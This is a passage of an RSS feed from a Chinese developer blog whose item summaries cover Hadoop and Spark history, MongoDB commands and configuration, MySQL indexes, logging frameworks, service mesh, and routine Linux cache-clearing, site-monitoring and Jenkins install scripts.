2006年1月 Doug Cutting 加入雅虎 2006年2月 Apache Hadoop项目正式启动、支持MapReduce和HDFS独立发展 2006年4月 再188节点上（每节点10GB数据）运行排序测试集群需要47.9小时 2006年5月 雅虎建立一个300个节点的Hadoop研究集群 2006年5月 在500个节点运行排序测试集需要42个小时（硬件配置比四月份更优秀） 2006年11月 研究集群增加到600个节点 2006年12月 排序测试集在20个节点上运行1.8个小时、100个节点运行3.3个小时、500个节点运行5.2小时、900个节点需要7.8个小时。
2007年1月 研究集群增加到900个节点 2007年4月 研究集群增加到两个集群1000个节点
2008年4月 在900个节点上运行1TB排序测试集仅需要209秒 2008年10月 研究集群每天装载10TB数据
2009年3月 17个集群共24000个节点 2009年4月 在每分钟排序中胜出、59秒排序500GB（在1400个节点）、173分钟排序100TB数据（在3400节点）
 hadoop简介
大数据处理、应对数据处理出现的新的技术、 底层也就是大名鼎鼎的HDFS文件系统 对数据并发处理有极强的性能
  hadoop-wiki
 hadoop应用场景
随着数据量的增大、数据量已经到了PB级别、数据的存储也需要更加强大的技术来支持、
 hadoop组件
namenode节点负责存储目录 datanode节点负责存储数据
Map函数 接受一个键值对（key-value pair），产生一组中间键值对。 MapReduce框架会将map函数产生的中间键值对里键相同的值传递给一个reduce函数。 Reduce函数 接受一个键，以及相关的一组值，将这组值进行合并产生一组规模更小的值（通常只有一个或零个值）。</description>
    </item>
    
    <item>
      <title>spark 简介</title>
      <link>https://www.wuxinvip.com/blog/big-data/spark/spark-1/</link>
      <pubDate>Wed, 20 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/big-data/spark/spark-1/</guid>
      <description>spark发展史
Apache Spark Spark Logo 开发者 Apache软件基金会, 加州大学柏克莱分校AMPLab, Databricks 稳定版本 2.1.0 （2016年12月28日 ） 开发状态 活跃 编程语言 Scala, Java, Python 操作系统 Linux, Mac OS, Microsoft Windows 类型 数据分析, 机器学习算法 许可协议 Apache许可协议 2.0 网站 spark.apache.org 源代码库 github.com/apache/spark Apache Spark是一个开源集群运算框架，最初是由加州大学柏克莱分校AMPLab所开发。 相对于Hadoop的MapReduce会在运行完工作后将中介数据存放到磁盘中，Spark使用了存储器内运算技术，能在数据尚未写入硬盘时即在存储器内分析运算。 Spark在存储器内运行程序的运算速度能做到比Hadoop MapReduce的运算速度快上100倍，即便是运行程序于硬盘时，Spark也能快上10倍速度。 [1]Spark允许用户将数据加载至集群存储器，并多次对其进行查询，非常适合用于机器学习算法。
 spark简介
 spark应用场景
使用Spark需要搭配集群管理员和分布式存储系统。 Spark支持独立模式（本地Spark集群）、Hadoop YARN或Apache Mesos的集群管理。 [3] 在分布式存储方面，Spark可以和HDFS[4]、 Cassandra[5] 、OpenStack Swift和Amazon S3等接口搭载。 Spark也支持伪分布式（pseudo-distributed）本地模式，不过通常只用于开发或测试时以本机文件系统取代分布式存储系统。 在这样的情况下，Spark仅在一台机器上使用每个CPU核心运行程序。
 spark组件
Spark核心是整个项目的基础，提供了分布式任务调度，调度和基本的I／O功能。而其基础的程序抽象则称为弹性分布式数据集（RDDs），是一个可以并行操作、有容错机制的数据集合。 RDDs可以通过引用外部存储系统的数据集创建（例如：共享文件系统、HDFS、HBase或其他 Hadoop 数据格式的数据源）。 或者是通过在现有RDDs的转换而创建（比如：map、filter、reduce、join等等）。
RDD抽象化是经由一个以Scala, Java, Python的语言集成API所呈现，简化了编程复杂性，应用程序操纵RDDs的方法类似于操纵本地端的数据集合。
 spark集群</description>
    </item>
    
    <item>
      <title>DB 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/xmind-db/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/xmind-db/</guid>
      <description>   mysql 图谱     mongodb 图谱   </description>
    </item>
    
    <item>
      <title>事务 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/xmind-translation/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/xmind-translation/</guid>
      <description>   事务 图谱   </description>
    </item>
    
    <item>
      <title>分布式 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/xmind-%E5%88%86%E5%B8%83%E5%BC%8F/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/xmind-%E5%88%86%E5%B8%83%E5%BC%8F/</guid>
      <description>   分布式 图谱   </description>
    </item>
    
    <item>
      <title>协议 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/xmind-%E5%8D%8F%E8%AE%AE/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/xmind-%E5%8D%8F%E8%AE%AE/</guid>
      <description>   协议 图谱   </description>
    </item>
    
    <item>
      <title>各大开源组件解析 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/xmind-%E7%BB%84%E4%BB%B6%E8%A7%A3%E6%9E%90/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/xmind-%E7%BB%84%E4%BB%B6%E8%A7%A3%E6%9E%90/</guid>
      <description>spring dubbo lucence spring
   spring 图谱     dubbo 图谱     lucence 图谱     java 图谱   </description>
    </item>
    
    <item>
      <title>密码加密 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/xmind-%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%86/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/xmind-%E5%AF%86%E7%A0%81%E5%8A%A0%E5%AF%86/</guid>
      <description>   密码加密 图谱   </description>
    </item>
    
    <item>
      <title>搜索引擎·一 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/xmind-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E0/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/xmind-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E0/</guid>
      <description>   搜索引擎简介 图谱     搜索引擎通用特点 图谱      SEO 图谱      爬虫 图谱   </description>
    </item>
    
    <item>
      <title>搜索引擎·二 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/xmind-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E1/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/xmind-%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E1/</guid>
      <description>   nutch 图谱     lucence 图谱     egothor 图谱     lire 图谱     compass 图谱     indextank 图谱     solandra 图谱     solr 图谱     elasticsearch 图谱   </description>
    </item>
    
    <item>
      <title>权限 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/xmind-%E6%9D%83%E9%99%90/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/xmind-%E6%9D%83%E9%99%90/</guid>
      <description>   权限 图谱   </description>
    </item>
    
    <item>
      <title>消息中间件 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/xmind-%E6%B6%88%E6%81%AF%E4%B8%AD%E9%97%B4%E4%BB%B6/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/xmind-%E6%B6%88%E6%81%AF%E4%B8%AD%E9%97%B4%E4%BB%B6/</guid>
      <description>   消息中间件特点 图谱     rabbitmq 图谱     rocketmq 图谱     zeromq 图谱     kafka 图谱     activemq 图谱   </description>
    </item>
    
    <item>
      <title>算法 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/xmind-%E7%AE%97%E6%B3%95/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/xmind-%E7%AE%97%E6%B3%95/</guid>
      <description>   算法 图谱   </description>
    </item>
    
    <item>
      <title>线程 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/xmind-%E7%BA%BF%E7%A8%8B/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/xmind-%E7%BA%BF%E7%A8%8B/</guid>
      <description>线程 图谱   java锁 详细见xmind-锁</description>
    </item>
    
    <item>
      <title>缓存 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/xmind-%E7%BC%93%E5%AD%98/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/xmind-%E7%BC%93%E5%AD%98/</guid>
      <description>   缓存 图谱      memcached 图谱      redis 图谱   </description>
    </item>
    
    <item>
      <title>设计模式 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/xmind-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/xmind-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</guid>
      <description>   设计模式 图谱   </description>
    </item>
    
    <item>
      <title>负载均衡 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/xmind-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/xmind-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</guid>
      <description>   负载均衡 图谱   </description>
    </item>
    
    <item>
      <title>锁 图谱</title>
      <link>https://www.wuxinvip.com/blog/xmind/xmind-%E9%94%81/</link>
      <pubDate>Tue, 12 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/xmind/xmind-%E9%94%81/</guid>
      <description>锁 图谱   mysql锁、优化</description>
    </item>
    
    <item>
      <title>easy-cloud</title>
      <link>https://www.wuxinvip.com/blog/spring-cloud/easy-cloud/</link>
      <pubDate>Sat, 09 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-cloud/easy-cloud/</guid>
      <description>总有一件事 是你想做的
代码地址github
 add 用户认证请求授权 用户授权返回授权令牌 *第三方请求权限 返回请求令牌 *校验系统是否注册 *校验用户是否存在 保存redis mq落地db *返回授权调用code 一般使用一次 五分钟 *校验用户凭证 本系统分发出去用户确定用户有效唯一凭证 可以是登陆token * 第零 确定system是否有效 * 第一确定code有效 * 第二验证用户token * 第三分配数据访问权限 保存redis mq落地db * 第四 返回 授权令牌 * * 之后第三方系统 携带 系统id 用户账号 以及想访问的资源 向我系统请求数据  </description>
    </item>
    
    <item>
      <title>mongodb 使用</title>
      <link>https://www.wuxinvip.com/blog/mongodb/mongodb-4/</link>
      <pubDate>Wed, 06 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mongodb/mongodb-4/</guid>
      <description>mongodb 使用
 文档性数据库 针对类型、无格式文档、只根据id、type区分 代码 使用封装data-mongodb数据 @Autowired MongoTemplate mongoTemplate; mongoTemplate.save(logDocument); //入参 当前第1页、显示20条数据、搜索类型demo封装类 Query query = new Query(); //构造分页请求信息 Sort sort = new Sort(Sort.Direction.DESC,&amp;quot;createTime&amp;quot;); PageRequest pageRequest = new PageRequest(1,20,sort); query.with(pageRequest); query.addCriteria(Criteria.where(&amp;quot;id&amp;quot;).is(demo.getId()); mongoTemplate.find(query,LogDocument.class); ///指定全文模糊匹配检索 代码片段 用作以后参考 TextCriteria criteria = new TextCriteria(); Map&amp;lt;String,String&amp;gt; map = JsonUtil.beanToMap(demo); for(String string :map.values()){ criteria.matching(string); }  </description>
    </item>
    
    <item>
      <title>mongodb 命令</title>
      <link>https://www.wuxinvip.com/blog/mongodb/mongodb-3/</link>
      <pubDate>Wed, 06 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mongodb/mongodb-3/</guid>
      <description>mongodb 命令
#启动 /opt/env/mongodb-3.6.5/bin/mongod --config /etc/mongod.conf --config 加载配置 --dbpath 数据存放路径 --port 启动端口 --fork 以守护方式启动进程 相当于 nohup **** &amp;amp; --logpath 日志路径 --append 追加日志 保留以前日志 --directoryperdb 每个数据库单独一个文件夹 #数据库操作 show dbs; show collections; show users; use &amp;lt;db_name&amp;gt;;//如果存在切换 如果不存在 新建并切换 #查看帮助 db.help(); db.foo.help(); db.foo.find(); db.foo.find({a:1}); #查看状态 db.status(); db.version(); #查看当前链接机器地址 db.getMongo(); db.shutdownServer(); #数据操作 db.user.find(); db.user.findOne(); db.user.update(); db.user.remove();  </description>
    </item>
    
    <item>
      <title>mongodb 简介</title>
      <link>https://www.wuxinvip.com/blog/mongodb/mongodb-1/</link>
      <pubDate>Wed, 06 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mongodb/mongodb-1/</guid>
      <description>mongodb 官方doc BSON格式文档型分片存储服务 BSON格式 与json类似 优点：解释快
应用点：支持大量存储、数据格式灵活多样、广泛的索引结构、优秀的集群管理 缺点：不支持事务、成本高
mongodb 组成部件
1、实际存储服务分片--存储json数据 2、路由 mongos--负责把请求转发到正确的服务器上 3、配置服务器---跟踪服务集群状态 每个组件都是集群服务、即多进程服务、更稳定、预防节点宕机倒是集群gg  mongodb 数据结构
与es一样 document文档行数据库 Collections ： 文档集合 document ： 文档 特殊存储 GridFS：因为bson对象的大小有限制，不适合存储大型文件，GridFS文件系统为大型文件提供了存储的方案，GridFS下的fs保存的是图片、视屏等大文件。  mongodb 存储方式
集群 自动扩散是分片存储。 自动检测分片存储数据大小、数据自动流转到空闲节点、对外使用暴露统一服务调用  mongodb 存储引擎
MongoDB支持多个存储引擎 MongoDB 3.2开始的默认存储引擎使用WiredTiger 它非常适合大多数工作负载，建议用于新部署。 WiredTiger提供了文档级并发模型，检查点和压缩等功能。在MongoDB Enterprise中，WiredTiger还支持静态 加密。 3.2之前的MongoDB版本的默认存储引擎 是 MMAPv1。 MMAPv1在具有大量读取和写入以及就地更新的工作量上表现良好。  mongodb 存储索引
Single Field【单字段索引】 Compound Index【复合索引】 Multikey Index【多键索引】 Geospatial Index【地理空间索引】 Text Indexes【文本索引】 Hashed Indexes【hash索引】 Unique Indexes【唯一索引】 Partial Indexes【部分索引、3.2之后新加索引】 索引符合指定过滤器表达式的集合中的文档。 通过索引集合中的文档子集，部分索引的索引创建和维护的存储需求更低，性能成本更低。 部分索引提供了稀疏索引功能的超集，应该优先于稀疏索引。 Sparse Indexes【稀疏索引】 索引仅包含具有索引字段的文档的条目。索引跳过没有索引字段的文档。 TTL Indexes【TTL索引】  TTL索引是一些特殊的索引，MongoDB可以在一段时间后使用它自动从集合中删除文档。这对于某些类型的信息比如机器生成的事件数据，日志和会话信息是理想的，这些信息只需要在有限的时间内保留在数据库中。</description>
    </item>
    
    <item>
      <title>mongodb 集群</title>
      <link>https://www.wuxinvip.com/blog/mongodb/mongodb-2/</link>
      <pubDate>Wed, 06 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mongodb/mongodb-2/</guid>
      <description>mongodb 配置
# mongod.conf # for documentation of all options, see: # http://docs.mongodb.org/manual/reference/configuration-options/ # where to write logging data. systemLog: destination: file logAppend: true #path: /var/log/mongodb/mongod.log path: /opt/env/mongodb-3.6.5/log/mongod.log # Where and how to store data. storage: #dbPath: /var/lib/mongo dbPath: /opt/env/mongodb-3.6.5/data journal: enabled: true # engine: # mmapv1: # wiredTiger: # how the process runs processManagement: fork: true # fork and run in background pidFilePath: /var/run/mongodb/mongod.pid # location of pidfile # network interfaces net: port: 27027 bindIp: 0.</description>
    </item>
    
    <item>
      <title>kuberments</title>
      <link>https://www.wuxinvip.com/blog/service-mesh/service-mesh-2/</link>
      <pubDate>Mon, 04 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/service-mesh/service-mesh-2/</guid>
      <description>pdf 文档</description>
    </item>
    
    <item>
      <title>service-mesh简介</title>
      <link>https://www.wuxinvip.com/blog/service-mesh/service-mesh-1/</link>
      <pubDate>Mon, 04 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/service-mesh/service-mesh-1/</guid>
      <description>什么是service-mesh？ 字面理解服务网格
功能：代理服务实现微服务功能、
服务发现 负载均衡 路由 流量控制 通信可靠性 弹性可伸缩 安全 监控以及日志  有人会说 这个为服务网关 不是早就实现了吗？
答：是，是实现了、但是所有的技术都有取舍、缺陷、 为服务上的网管对服务的侵入太多、太多的网管代理还会使服务变得很臃肿、 作为对外的唯一暴露服务、他的弹性伸缩做的还比较差、需要重启服务网关重新加载服务代理  service-mesh 服务治理做了什么？
答：服务网格基于docker、kuberments Service Mesh由data plane构成，其中所有服务通过sidecar代理进行服务通信。 （所有代理相互连接形成一个Mesh，Service Mesh由此得名） 网格同时包含一个control plane——可以将所有独立的sidecar代理连接到一个分布式网络中， 并设置网格还包括一个控制平面——它将所有独立的sidecar代理连接到一个分布式网络中， 并设置由data plane指定的策略。 Control plane定义服务发现、路由、流量控制等策略。 这些策略可以是全局的，也可以是限定的。Data plane负责在通信时应用和执行这些策略。  service-mesh 与 spring-cloud
service-mesh 是一套全新的服务网格系统、不渗入原有代码 使用代理slipder完成服务代理 请求 spring-cloud spring家族 面对现有组建众多复杂性、打造出一个cloud专版、 理论点：连接一切、集成市场主流应用 两者都是在为微服务做着自己的方向、互不侵犯、互不融合、各有各的目标和愿景 现有体系下 都在上云、很多确实都是在 先上springcloud 再上service-mesh 最起码等待实际生产环境的验证  一种明悟、应用组件这种发展越来越嵌入基础层、所有共性的服务渐渐的由应用层组件转向了计算机网络通信组件、就像tcp、 如果说spring cloud是应用级别的分布式服务控制、那么service mesh是建立在计算机基础服务上的分布式服务控制 提取了共性的服务注册、服务代理 做出了一套基础计算机服务、专门面向分布式系统的一种基础服务、未来会不会像mysql一样流行、
原文地址
资料地址</description>
    </item>
    
    <item>
      <title>日志发展史</title>
      <link>https://www.wuxinvip.com/blog/log/log-total/</link>
      <pubDate>Mon, 04 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/log/log-total/</guid>
      <description>日志总图   接口定制组建使用interface标识
具体实现组建使用class标识
you must know
从log4j到log4j2.0 logback是log4j升级版 是slf4j完美实现
sun出品的接口JUL、后来的commons-logging
ceki写的slf4j、logback、log4j、log4j2.0
这人简直神了 日志发展史上重要人物啊 写一个一个规则
现在多数工厂都在用logback 不过想原文讲的log4j2.0 在针对新业务的特性上 有很大提升
log4j特性、也奠定了日志大致方向
1、允许应用记录日志对象、开发不考虑日志输出位置、日志信息以object传递 2、每个logger互相独立 以名字标识区分 3、Appender属性 配置日志输出路径【文件、consoler、DB、MQ、etc】 4、level 定制日志级别输出  logback特性
xml配置方式和grovvy支持 自动重载有变更配置文件 自动压缩日志 打印异常信息自动包含package名称以及版本号 filters    日志组建发展时间图   slf4j简介   slf4j 结构图   使用“{}” 代替参数传输 绑定方式：混合绑定、桥接绑定  混合绑定
两种方式：使用适配器接向底层实现interface 、或者直接实现slf4j 接口 适配器：slf4j+log4j[1.2.17] slf4j+JDK14[1.7.21] 接口实现：logback-classic[1.0.13]、slf4j-simple[1.7.21]    slf4j 混合绑定   桥接绑定</description>
    </item>
    
    <item>
      <title>日志服务的选型</title>
      <link>https://www.wuxinvip.com/blog/log/log-selected/</link>
      <pubDate>Mon, 04 Jun 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/log/log-selected/</guid>
      <description>众所周知.
日志系统分为：系统日志和业务日志 业务日志又可分为请求日志和操作日志
系统日志
cpu、内存、请求量、当前连接数、连接时间等等  请求日志
谁、请求那个系统上的什么资源、 源ip 系统id 目标ip 目标url  操作日志
 需求：各个子系统统一业务日志收集、 这些日志消息包括： 操作系统标识 操作者 操作模块 操作类型 操作时间 操作内容 操作结果 简而言之：什么人在什么时候修改了什么系统上的哪些模块的哪些内容 who 、when、where、what、how、【4w1h】 至于why 日志是检测不出来的。。。  方案一：mysql+logback
 优点：简单随库、成本低;持久化不丢失、支持读写分离、 缺点：表设计不free、一旦设计好就不能随意添加字段 不支持定时清理日志、占用数据库链接、 如果建立大量检索索引、添加数据要慢、如果索引较少、检索数据有不会很准确、 现阶段mysql5.5以后使用innodb引擎、而这种引擎最大的优点就是支持了事务、 变相的也降低了他的读写性能、但是在需求上不需要事务的支持、  方案二：mongdb+logback
 优点：支持定时清理、支持数据字段任意扩充【文档型】、 支持读写分离、检索识别度高、支持索引结构比较广泛、支持多种形式查询 缺点：成本稍微高 比mysql数据库要贵点、  方案三：ELK
【ELK】
方案四：Splunk
方案五：Fluentd
一般用在 k8s 容器服务的日志收集 CSDN
linux 运维
方案六：Flume
博客园
方案六：KafKa+logback</description>
    </item>
    
    <item>
      <title>linux 清空缓存</title>
      <link>https://www.wuxinvip.com/blog/shell/shell-3/</link>
      <pubDate>Wed, 30 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/shell/shell-3/</guid>
      <description>确认缓存或不用内存 free -m vi drop_caches.sh #页面缓存 echo 1 &amp;gt; /proc/sys/vm/drop_caches #目录缓存和inodes echo 2 &amp;gt; /proc/sys/vm/drop_caches #页面缓存，目录缓存和inodes echo 3 &amp;gt; /proc/sys/vm/drop_caches #清理文件系统缓存 sync save sh drop_caches.sh  注意: 上述所有命令都对系统无害，且只会有助于释放不用的内存。
而且sync还会清理僵尸(zombie)对象和它们占用的内存。
但是，如果你执行这些命令时正在写数据，你实际上在数据到达磁盘之前就将它从文件缓存中清除掉了, 这可能会造成很不好的影响。
所以，为了避免这种事情发生，你可以echo值到/proc/sys/vm/vfs_cache_pressure中，
告诉内核，当清理inoe/dentry缓存时应该用什么样的优先级。
LinuxInSight对值的范围解释得很清楚:
vfs_cache_pressure=100是默认值，内核会尝试重新声明dentries和inodes，
并采用一种相对于页面缓存和交换缓存比较”合理”的比例。
减少vfs_cache_pressure会导致内核倾向于保留dentry和inode缓存。
而增加vfs_cache_pressure超过100时，则会导致内核倾向于重新声明dentries和inodes
简而言之，小于100的值不会导致缓存的大量减少。超过100的值则会告诉内核你希望以高优先级来清理缓存。
其实，无论你采用什么值，内核清理缓存的速度都是比较低的。
如果将此值设置为10000，系统将会将缓存减少到一个合理的水平。</description>
    </item>
    
    <item>
      <title>linux 监控服务脚本</title>
      <link>https://www.wuxinvip.com/blog/shell/shell-4/</link>
      <pubDate>Wed, 30 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/shell/shell-4/</guid>
      <description>#!/bin/sh weblist=/shell/web_monit/weblist.txt for list in `cat $weblist|grep -E -v &amp;quot;#|^$&amp;quot;` do httpcode=`curl -o /dev/null -s -w %{http_code} &amp;quot;$list&amp;quot;` httptime=`curl -o /dev/null -s -w &amp;quot;time_connect: %{time_connect}\ntime_starttransfer: %{time_starttransfer}\ntime_total: %{time_total}\n&amp;quot; &amp;quot;$list&amp;quot;|grep time_total|awk -F &amp;quot;:&amp;quot; &#39;{print $2*1000}&#39;` if [ $httpcode = 500 ]||[ $httpcode = 502 ]||[ $httpcode = 503 ]||[ $httpcode = 504 ] then curl -d &amp;quot;mobile=13800008888&amp;amp;text=访问 $list 超时&amp;quot; &amp;quot;http://127.0.0.1/sms/&amp;quot; else echo &amp;quot;$list is checked ok!&amp;quot; fi if [ $httptime -ge 3000 ] then curl -d &amp;quot;mobile=13800008888&amp;amp;text=访问 $list 超时&amp;quot; &amp;quot;http://127.</description>
    </item>
    
    <item>
      <title>mysql 索引</title>
      <link>https://www.wuxinvip.com/blog/mysql/mysql-indexes/</link>
      <pubDate>Wed, 30 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/mysql/mysql-indexes/</guid>
      <description>mysql 索引
单列索引 1、普通索引--允许null和重复--优点就是查询快 2、唯一索引--允许null 但是不可重复 3、主键索引--不允许null 不可重复 组合索引 1、联合索引【组合索引】 多个字段创建一个索引健、只有最左边的索引被用到 联合索引才能被用到 索引最多包含16列 全文索引 1、全文索引 MyISAM 引擎独有 只能用在 char varchar text使用 检索文字关键字 空间索引 1、空间索引 针对空间数据类型的字段所建立的索引 MyISAM 引擎独有 空间引擎所在列 not null 支持数据类型 geometry、point、linestring、polygon 创建索引使用 spatial 关键字 纠正： MyISAM并InnoDB 支持空间类型的R-tree索引。 其他存储引擎使用B树来索引空间类型（除了 ARCHIVE不支持空间类型索引）。 所有的索引 必须合适业务使用在创建 对于更新频繁 检索较少的不得加除了主键索引之外的任何索引 徒增insert 和 update delete 消耗  B树和散列索引的比较 了解B树和散列数据结构可以帮助预测不同的查询在使用索引中的这些数据结构的不同存储引擎上的性能。
特别是用于MEMORY允许您选择B树或散列索引的存储引擎。 B树 区分大小 【小于 大于 大于等于 小于等于】 hash树 确定值【等于】
检索索引是否有效 explain</description>
    </item>
    
    <item>
      <title>为什么你成不了架构师</title>
      <link>https://www.wuxinvip.com/blog/essay/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E6%88%90%E4%B8%8D%E4%BA%86%E6%9E%B6%E6%9E%84%E5%B8%88/</link>
      <pubDate>Wed, 30 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/essay/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E6%88%90%E4%B8%8D%E4%BA%86%E6%9E%B6%E6%9E%84%E5%B8%88/</guid>
      <description>近期入职新公司 接手架构重构 感慨颇多、也学到不少东西、
学会了时间不使用timestamp 使用bigint、价格不使用decimal 而是int or bigint
以前常念叨 适合业务的技术才是最好的技术、却少有感慨
为什么使用bigint作为时间单位？ 1、首先兼容oracle、其次项目内部流转不容易异常【项目中是这个说法、貌似timestamp我也没碰到过异常】
2、还有就是int值比较容易比较 尤其针对范围查询 较快些吧、估计timestamp底层比较就是int方式
为什么使用int或者bigint作为价格单位 1、首先这点不能一定就说项目中就一定是对的、暂时没有想到以前的设计方案
项目中的想法了解到、价格小数点取到后四位 1.0001元、
2、当然decimal肯定可以甚至可以更好的decimal（10，5）这样的设计我觉得会更好
事实上现在也出现了问题 总价格不能超过2100000.00000【int的最大值】
系统重构是痛苦的、后续任务中涉及表重构、需要设计索引、
以前曾经擅自在项目表设计上加过联合索引、被领导小训了一顿、
从此对之是挺害怕的、甚至到之前一直都不知道为什么错了、知识水平有限
回家路上是左思右想、有了这么几个猜测
1、使用explian table查询表索引 联合索引两个字段有一个被索引另一个没有索引 2、联合索引、更新表要更新索引缓存、而实际查询率并不高、 也就是说花费了巨大的代价去维护一个索引健、而用到的时候却比较少 3、我擅自增加索引的表是用户表、用户表更新比较频繁、查询较少、 进一步增大了【2】的代价去干了不该干的事、 4、一系列的骚操作、不知道底层就瞎搞胡搞、须知所有的设计都是有利有弊、 都是为了某些业务场景而设计、把不该用的配置用到不该用的业务上、就会与期望值南辕北辙  为什么你成不了架构师？ 每一个系统都有自己的业务需求、天下没有两片一样的叶子、也没有两个一样的系统、
即使业务需求一样、不同的程序员也会设计出不同的系统
 都在讲架构师要有两方面准备【技术架构】和【业务架构】 技术架构：从最简单的LAMP【linux+apache tomcat+mysql+php】到SOA、 到微服务、以及各个组件的针对场景使用 业务架构：这个是选择来的、不同的公司在做不同的业务、没有业务架构知识、 你连一个表都设计不出来、不了解业务面对老系统设计都不敢动、还谈什么架构？ 就像 我为什么在这使用中文：而不是英文: 因为中文间距宽 更易读、而使用英文 间距小 不容易读  只去关注技术的优缺点、永远成不了架构师、只有了解系统的特点、才能更好的设计出一个优秀的系统、又快又稳定。</description>
    </item>
    
    <item>
      <title>git error</title>
      <link>https://www.wuxinvip.com/blog/essay/git-email/</link>
      <pubDate>Mon, 28 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/essay/git-email/</guid>
      <description>git config --system --unset credential.helper 之后重新配置 user.name user.email  git 提交错误 The Git process exited with the code -1,073,741,819 版本问题 http://download.csdn.net/detail/huoyan403/9874429  </description>
    </item>
    
    <item>
      <title>base-cloud</title>
      <link>https://www.wuxinvip.com/blog/spring-cloud/base-cloud/</link>
      <pubDate>Sun, 27 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/spring-cloud/base-cloud/</guid>
      <description>他屌任他屌、我吃他大鸟
他皮任他皮、把他当瓜皮
代码地址gitee 代码地址github
develop 分支【使用gradle开发、属于开发比较良好的版本】</description>
    </item>
    
    <item>
      <title>jenkins部署</title>
      <link>https://www.wuxinvip.com/blog/service-deploy/jenkins/</link>
      <pubDate>Sat, 26 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/service-deploy/jenkins/</guid>
      <description>jenkins官网
基本环境 jdk8 curl -L -O https://prodjenkinsreleases.blob.core.windows.net/redhat-stable/jenkins-2.121.1-1.1.noarch.rpm rpm -ivh jenkins-2.121.1-1.1.noarch.rpm  </description>
    </item>
    
    <item>
      <title>nexus部署</title>
      <link>https://www.wuxinvip.com/blog/service-deploy/nexus/</link>
      <pubDate>Sat, 26 May 2018 00:00:00 +0000</pubDate>
      
      <guid>https://www.wuxinvip.com/blog/service-deploy/nexus/</guid>
